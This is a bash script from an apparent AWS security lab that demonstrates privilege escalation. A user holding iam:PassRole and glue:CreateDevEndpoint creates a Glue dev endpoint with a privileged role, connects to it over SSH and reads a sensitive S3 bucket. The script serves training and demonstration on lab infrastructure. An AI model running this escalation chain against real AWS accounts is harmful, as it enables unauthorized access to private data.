#!/bin/bash

# Demo script for iam:PassRole + glue:CreateDevEndpoint privilege escalation
# This scenario demonstrates how a user with PassRole and CreateDevEndpoint can escalate to bucket access


# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a command before executing it
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
STARTING_USER="pl-prod-glue-001-to-bucket-starting-user"
TARGET_ROLE="pl-prod-glue-001-to-bucket-target-role"
ENDPOINT_NAME="pl-glue-001-demo-endpoint"
SSH_KEY_PATH="/tmp/pl-glue-001-demo-key"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}IAM PassRole + Glue CreateDevEndpoint Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

echo -e "${RED}⚠️  COST WARNING ⚠️${NC}"
echo -e "${YELLOW}Glue Development Endpoints cost approximately $2.20/hour${NC}"
echo -e "${YELLOW}This demo will create an endpoint that may take 5-10 minutes to initialize${NC}"
echo -e "${YELLOW}The endpoint will be deleted at the end of this demo${NC}"
echo -e "${YELLOW}Please ensure cleanup_attack.sh is run if this script is interrupted${NC}\n"

# Step 1: Retrieve credentials and region from Terraform outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output using the grouped output pattern
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_bucket_glue_001_iam_passrole_glue_createdevendpoint.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials from the grouped output
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

# Extract readonly credentials for observation/polling steps
READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)

if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
    exit 1
fi

# Get region
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
echo "Region: $AWS_REGION"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Credential switching helpers
use_starting_creds() {
    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
    unset AWS_SESSION_TOKEN
}
use_readonly_creds() {
    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}

# Source demo permissions library for validation restriction
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/../../../../../../scripts/lib/demo_permissions.sh"

# Restrict helpful permissions during validation run
restrict_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
setup_demo_restriction_trap "$SCRIPT_DIR/scenario.yaml"

# [EXPLOIT] Step 2: Verify starting user identity
echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION

echo "Using region: $AWS_REGION"

# Verify starting user identity
show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# [OBSERVATION] Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
use_readonly_creds
show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# [EXPLOIT] Step 4: Verify we don't have bucket access yet
echo -e "${YELLOW}Step 4: Verifying we don't have bucket access yet${NC}"
use_starting_creds

# Extract bucket name from Terraform outputs
BUCKET_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.sensitive_bucket_name')

if [ "$BUCKET_NAME" == "null" ] || [ -z "$BUCKET_NAME" ]; then
    echo -e "${RED}Error: Could not retrieve bucket name from terraform output${NC}"
    exit 1
fi

echo "Target bucket: $BUCKET_NAME"
echo "Attempting to access bucket: $BUCKET_NAME"
show_cmd "Attacker" "aws s3 ls s3://$BUCKET_NAME"
if aws s3 ls s3://$BUCKET_NAME &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have bucket access already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot access bucket (as expected)${NC}"
fi
echo ""

# Step 5: Generate SSH key pair for Glue endpoint
echo -e "${YELLOW}Step 5: Generating SSH key pair for Glue dev endpoint${NC}"
echo "Key path: $SSH_KEY_PATH"

# Remove any existing key
rm -f ${SSH_KEY_PATH} ${SSH_KEY_PATH}.pub

# Generate new SSH key pair (no passphrase)
ssh-keygen -t rsa -b 2048 -f ${SSH_KEY_PATH} -N "" -C "pl-glue-001-demo" > /dev/null 2>&1

if [ ! -f ${SSH_KEY_PATH}.pub ]; then
    echo -e "${RED}Error: Failed to generate SSH key pair${NC}"
    exit 1
fi

SSH_PUBLIC_KEY=$(cat ${SSH_KEY_PATH}.pub)
echo "SSH public key generated"
echo -e "${GREEN}✓ SSH key pair generated${NC}\n"

# [EXPLOIT] Step 6: Create Glue dev endpoint with privileged role
echo -e "${YELLOW}Step 6: Creating Glue development endpoint with target role${NC}"
use_starting_creds
ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/${TARGET_ROLE}"
echo "Role ARN: $ROLE_ARN"
echo "Endpoint name: $ENDPOINT_NAME"
echo ""
echo "This is the privilege escalation vector - passing the S3-privileged role to Glue..."
echo -e "${YELLOW}Creating endpoint (this may take 5-10 minutes)...${NC}"

# Create the dev endpoint
show_attack_cmd "Attacker" "aws glue create-dev-endpoint --endpoint-name $ENDPOINT_NAME --role-arn $ROLE_ARN --public-key "$SSH_PUBLIC_KEY" --glue-version "1.0" --number-of-nodes 2 --region $AWS_REGION --output json"
aws glue create-dev-endpoint \
    --endpoint-name $ENDPOINT_NAME \
    --role-arn $ROLE_ARN \
    --public-key "$SSH_PUBLIC_KEY" \
    --glue-version "1.0" \
    --number-of-nodes 2 \
    --region $AWS_REGION \
    --output json > /dev/null

echo -e "${GREEN}✓ Glue dev endpoint creation initiated${NC}\n"

# [OBSERVATION] Step 7: Wait for endpoint to be ready
echo -e "${YELLOW}Step 7: Waiting for Glue dev endpoint to become ready${NC}"
use_readonly_creds
echo "This typically takes 5-10 minutes. Please be patient..."
echo ""

MAX_WAIT=900  # 15 minutes
WAIT_TIME=0
ENDPOINT_READY=false
DOTS=0

while [ $WAIT_TIME -lt $MAX_WAIT ]; do
    # Get endpoint status
    ENDPOINT_STATUS=$(aws glue get-dev-endpoint \
        --endpoint-name $ENDPOINT_NAME \
        --region $AWS_REGION \
        --query 'DevEndpoint.Status' \
        --output text 2>/dev/null || echo "UNKNOWN")

    if [ "$ENDPOINT_STATUS" = "READY" ]; then
        echo -e "\n${GREEN}✓ Endpoint is ready!${NC}\n"
        ENDPOINT_READY=true
        break
    elif [ "$ENDPOINT_STATUS" = "FAILED" ]; then
        echo -e "\n${RED}Error: Endpoint creation failed${NC}"
        exit 1
    fi

    # Show progress
    if [ $((DOTS % 6)) -eq 0 ]; then
        echo -n "Status: $ENDPOINT_STATUS "
    fi
    echo -n "."
    DOTS=$((DOTS + 1))

    sleep 10
    WAIT_TIME=$((WAIT_TIME + 10))
done

echo ""

if [ "$ENDPOINT_READY" = false ]; then
    echo -e "${RED}Error: Endpoint did not become ready within timeout${NC}"
    echo "Endpoint name: $ENDPOINT_NAME"
    echo "You may need to delete it manually using cleanup_attack.sh"
    exit 1
fi

# [OBSERVATION] Step 8: Get endpoint SSH address
echo -e "${YELLOW}Step 8: Retrieving endpoint connection details${NC}"
use_readonly_creds
show_cmd "ReadOnly" "aws glue get-dev-endpoint --endpoint-name $ENDPOINT_NAME --region $AWS_REGION --query 'DevEndpoint.PublicAddress' --output text"
ENDPOINT_ADDRESS=$(aws glue get-dev-endpoint \
    --endpoint-name $ENDPOINT_NAME \
    --region $AWS_REGION \
    --query 'DevEndpoint.PublicAddress' \
    --output text)

if [ -z "$ENDPOINT_ADDRESS" ] || [ "$ENDPOINT_ADDRESS" = "None" ]; then
    echo -e "${RED}Error: Could not get endpoint address${NC}"
    exit 1
fi

echo "Endpoint address: $ENDPOINT_ADDRESS"
echo -e "${GREEN}✓ Retrieved endpoint connection details${NC}\n"

# [OBSERVATION] Step 9: Wait a bit more for SSH to be fully available
echo -e "${YELLOW}Step 9: Waiting for SSH service to be available${NC}"
echo "Giving the endpoint another 30 seconds to ensure SSH is ready..."
sleep 30
echo -e "${GREEN}✓ SSH should now be available${NC}\n"

# [EXPLOIT] Step 10: SSH into endpoint and access S3 bucket
echo -e "${YELLOW}Step 10: Connecting to endpoint via SSH and accessing S3 bucket${NC}"
echo "SSH connection: glue@$ENDPOINT_ADDRESS"
echo "Executing command to read sensitive data from S3..."
echo ""

# Set SSH options for non-interactive use
SSH_OPTS="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR -o ConnectTimeout=10"

# Try SSH connection with retry logic
MAX_SSH_RETRIES=6
SSH_RETRY=0
SSH_SUCCESS=false

while [ $SSH_RETRY -lt $MAX_SSH_RETRIES ]; do
    echo "Attempting SSH connection (attempt $((SSH_RETRY + 1))/$MAX_SSH_RETRIES)..."

    # Execute AWS CLI command on the endpoint to read the sensitive file
    show_attack_cmd "Attacker" "aws s3 cp s3://$BUCKET_NAME/sensitive-data.txt -"
    SENSITIVE_DATA=$(ssh -i ${SSH_KEY_PATH} $SSH_OPTS glue@$ENDPOINT_ADDRESS \
        "aws s3 cp s3://$BUCKET_NAME/sensitive-data.txt -" 2>/dev/null || echo "")

    if [ -n "$SENSITIVE_DATA" ]; then
        SSH_SUCCESS=true
        break
    fi

    echo "SSH connection not ready yet, waiting 10 seconds..."
    sleep 10
    SSH_RETRY=$((SSH_RETRY + 1))
done

if [ "$SSH_SUCCESS" = false ]; then
    echo -e "${RED}Error: Could not establish SSH connection to endpoint${NC}"
    echo "The endpoint may need more time to initialize SSH service"
    echo "Endpoint details:"
    aws glue get-dev-endpoint --endpoint-name $ENDPOINT_NAME --region $AWS_REGION
    exit 1
fi

echo -e "${GREEN}✓ Successfully connected via SSH${NC}"
echo ""

# [OBSERVATION] Step 11: Display the sensitive data
echo -e "${YELLOW}Step 11: Verifying bucket access${NC}"
echo "Contents of s3://$BUCKET_NAME/sensitive-data.txt:"
echo ""
echo -e "${BLUE}----------------------------------------${NC}"
echo "$SENSITIVE_DATA"
echo -e "${BLUE}----------------------------------------${NC}"
echo ""
echo -e "${GREEN}✓ Successfully read sensitive data from S3!${NC}"
echo -e "${GREEN}✓ BUCKET ACCESS CONFIRMED${NC}"
echo ""

# [EXPLOIT] Step 12: List bucket contents to show full access
echo -e "${YELLOW}Step 12: Listing bucket contents to demonstrate full access${NC}"
echo "Listing all objects in bucket..."
echo ""

show_attack_cmd "Attacker" "aws s3 ls s3://$BUCKET_NAME/"
ssh -i ${SSH_KEY_PATH} $SSH_OPTS glue@$ENDPOINT_ADDRESS \
    "aws s3 ls s3://$BUCKET_NAME/"

echo ""
echo -e "${GREEN}✓ Full bucket access confirmed${NC}\n"

# Summary
# Restore helpful permissions for manual exploration
restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"

echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (with iam:PassRole + glue:CreateDevEndpoint)"
echo "2. Generated SSH key pair for Glue access"
echo "3. Created Glue dev endpoint with privileged role: $TARGET_ROLE"
echo "4. Waited for endpoint to become ready (~5-10 minutes)"
echo "5. Connected to endpoint via SSH"
echo "6. Used role credentials to access sensitive S3 bucket: $BUCKET_NAME"
echo "7. Achieved: Full access to sensitive data"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo -e "  $STARTING_USER → (glue:CreateDevEndpoint + iam:PassRole)"
echo -e "  → Glue Dev Endpoint with $TARGET_ROLE"
echo -e "  → SSH Access → S3 Bucket Access"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo ""
    echo -e "${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- Glue dev endpoint: $ENDPOINT_NAME"
echo "- SSH key pair: ${SSH_KEY_PATH} / ${SSH_KEY_PATH}.pub"

echo -e "\n${RED}⚠ Warning: The Glue dev endpoint is still running and costing ~$2.20/hour${NC}"
echo -e "${RED}⚠ The endpoint must be deleted to stop charges${NC}"
echo ""
echo -e "${YELLOW}To clean up and stop costs:${NC}"
echo "  ./cleanup_attack.sh or use the plabs TUI/CLI"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
